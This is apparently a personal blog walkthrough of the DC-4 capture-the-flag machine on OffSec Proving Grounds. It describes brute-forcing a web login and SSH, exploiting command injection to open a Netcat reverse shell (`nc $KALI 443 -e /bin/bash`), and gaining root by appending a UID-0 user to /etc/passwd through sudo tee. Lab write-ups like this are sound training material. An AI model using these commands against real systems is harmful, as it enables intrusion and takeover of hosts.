---
author: Greenjam94
categories:
- Walkthroughs
tags:
- ProvingGrounds
- OffSec
- Linux
- web attack
- burpsuite
- brute force
- sudo
- hydra
ct_period_last_updated:
- default
date: "2022-04-29T21:44:27Z"
title: Proving Grounds DC4 Writeup
url: /proving-grounds-dc4-writeup/
---

DC-4 is the fourth machine in the DC series on Vulnhub and the third available in OffSec's [Proving Grounds Play](https://portal.offensive-security.com). S1ren did a [live stream on
twitch.tv](https://twitch.tv/offsecofficial) explaining this machine and the recording is on [YouTube](https://www.youtube.com/watch?v=scFBo3j6iLM&ab_channel=OffensiveSecurity). If you are looking for DC3, I will be uploading a post later. Currently I host my target on VMware machines and DC3 was not working well. I plan on switching to virtualbox with a different computer soon.

# Summary

DC-4 is more challenging then the previous machines in the series. Less information is available for initial enumeration of the box. The intent remains to start with a web application and find a way to a root shell on the machine. Exploiting DC-4 requires various brute force techniques, which can be slow if done over a network connection. This may be a good machine to download from Vulnhub and run locally to improve performance.

# Enumeration

## Nmap

After having to scan with nmap multiple times for [DC-2](/proving-grounds-dc2-writeup), I took a page from S1ren's book and added `-p-` to my initial scan. The full command was `nmap -p- -sCV 192.168.67.195 --open -oA nmap-sCV-allports`.

![Initial nmap results](/images/DC4/1-nmap-dc4.png)

The only two listening ports were SSH on port 22 and Nginx on port 80. Without known credentials, SSH is a difficult target so Nginx is the first service I reviewed.

## Manual web review

Visiting the machine with a web browser revealed a simple login page. There was no additional content or links outside the form for a username and password. Viewing the page's source did not reveal any public application names or versions. The form showed that a POST request with a username and password would be sent to login.php, which confirmed the programming language used for the site.

![DC4 web login](/images/DC4/2-web-dc4.png)

To test for error messages, I tried to login with "fakeuser" and "fakepassword". There was no error but the page reloaded. I tried again with "admin" for both the username and password, same result. Next I attempted to look for SQL injection (SQLi), but no database errors or successful login attempts were made.

# Vulnerability Assessment

At this point, the web site appeared to be a minimal login page, possibly a custom application because of it's simplicity. Maybe the intention is to brute force the login?

There was not much evidence to point to other options. By enumerating the site, there was no application information to review public research. Errors were also not being returned to identify users or SQLi vulnerabilities.

# Exploitation

## Brute force the website login

![Burpsuite Intruder](/images/DC4/3-intruder-dc4.png)

Without a proper error message, using Hydra would be difficult. I used Burpsuite's Intruder module to guess a password for an admin user.
Kali comes with a variety of wordlists in the `/usr/share/wordlists` directory, one of the largest being rockyou.txt which contains commonly used passwords identified in past data breaches. I monitored a POST request from a login attempt and sent it to Intruder in order to try each password in my chosen wordlist.

![Burpsuite Intruder](/images/DC4/3b-intruder-dc4.png)

This is where the combination of Burpsuite community and using OffSec's Proving Ground hurt. Knowing that it would take hours for me to process rockyou.txt, I cheated and verified with S1ren's walkthrough what the expected password was. The same password was in the much smaller `/usr/share/wordlists/wfuzz/general/big.txt` wordlist, which had around 3,000 values in total. Even with the smaller wordlist it took 20 minutes to check 100 passwords. This was due to my free Burpsuite community license restricting Intruder to a single thread, and the networking lag of using a target hosted online. Eventually I cancelled my attempt and continued with the creds from the other walkthrough. **admin:happy**

This revealed a command.php page that allowed for a few harmless linux commands to run against the machine.

![command webpage](/images/DC4/4-webcmd-dc4.png)

## Command execution

With Burpsuite still running, I was able to capture one of the requests for the command page. The POST form included a variable named "radio" and had a value of the command shown on the page. I would have expected the value to be an identifer tied to one of the three radio buttton options instead of the command itself, this sparked the idea that the variable was being passed to the system as is. Using Burpsuite's Repeater module I was able to modify the request and send a custom command for the radio variable.

![Burpsuite Repeater](/images/DC4/5-repeater-dc4.png)

I ran three commands and was able to quickly get a shell on the target machine. Running `whoami` identified that www-data was the low level user account executing the commands. Netcat was verified to be on the machine by getting a result from `which nc`. A reverse shell was opened by using Netcat to pass a bash shell to my Kali machine with `nc $KALI 443 -e /bin/bash`.

# Privilege Escalation

## Enumeration

With the ability to execute commands directly on the machine, it was time to further enumerate the machine to find an escalation path. The first thing I checked was the web folder and I did not find much, there was no config file with credentials or additional web pages of interest. Next I checked the /home directory to see if www-data had access to any full user's data. There were three users; charles, jim, and sam.

Jim's directory had the largest amount of data so I started there. There was a test.sh file which was writeable and executable by everyone. I attempted to modify it to use netcat however after running it I realized that it still executed as www-data and did not grant any new privileges.
Another file in Jim's directory was old-passwords.bak, this combined with the three new usernames gives us another opportunity for brute force.

## Exploitation

Hydra is a tool included on Kali that allows for various ways to brute force credentials. Unlike Burpsuite it also supports multiple threads so it can complete wordlists faster. Since the password file was found for Jim's user I targeted that user only for cracking.

![SSH bruteforce with Hydra](/images/DC4/6-sshcrack-dc4.png)

The command only took a few minutes to run and a valid password was found. Using this I could SSH into a stable shell as a full user instead of www-data.

![SSH mail](/images/DC4/7-sshmail-dc4.png)

I attempted to run `sudo -l` and search for bash history but neither panned out. Part of the SSH banner after logging in said "You have mail" so that was the next thing I checked.

![mail](/images/DC4/8-mail-dc4.png)

The mail contained another password for the charles user. With this I was able to switch user `su` and continue my enumeration for higher privileges. Charles was allowed to use sudo unlike Jim, he could run a program called teehee.

![su charles](/images/DC4/9-susudo-dc4.png)

### sudo tee

After a quick search on google, I found myself back on [GTFObins](https://gtfobins.github.io/gtfobins/tee/) researching a file editor called tee. Running tee with sudo would allow me to append to any file on the machine. This allows me to add a user to /etc/passwd with the root user's unique identifier (UID).

![create passwd hash](/images/DC4/10-createpasswd-dc4.png)

Before I could append a line to the passwd file, I had to generate a hash to use. `openssl passwd -1` creates a passwd hash from a provided password. Appeneding this value into a string like `hacker:<paste>:0:0:/home/hacker:/bin/bash` completed the line needed to create a user that I could switch to which had root's identifier.

![using tee](/images/DC4/11-sudoteehee-dc4.png)

Now with a new passwd entry, I used sudo and tee to append to the etc/passwd file. All that was left is to switch my user to the one just created and verify the user was identified as root.

![Getting a root shell](/images/DC4/12-privesc-dc4.png)

# Leasons learned

This machine was slightly more difficult than the earlier DC machines. There was less information available on the simple web application, so instead of exploiting known vulnerabilities for public services like Drupal or WordPress, other means had to be assessed. My choosen set up also made it difficult for worse reasons, choosing not to pay for a Burpsuite license and using a hosted target machine slowed down my brute force attempts and overall increased the time required to complete the machine. Due to this, brute force is not commonly seen in capture the flag events or easier exercises because of the time required.

## Target information

OS: Debian Linux

Services:
- Nginx 1.15.10 on port 80 hosting a simple password protected command web application
- OpenSSH on port 22

## Tools and more

While [brute force](/online-brute-forcing-101) can be time consuming, it does require the use of some tools not commonly used. Hydra was used for SSH brute forcing and BurpSuite's Intruder allowed for brute forcing the web login. 

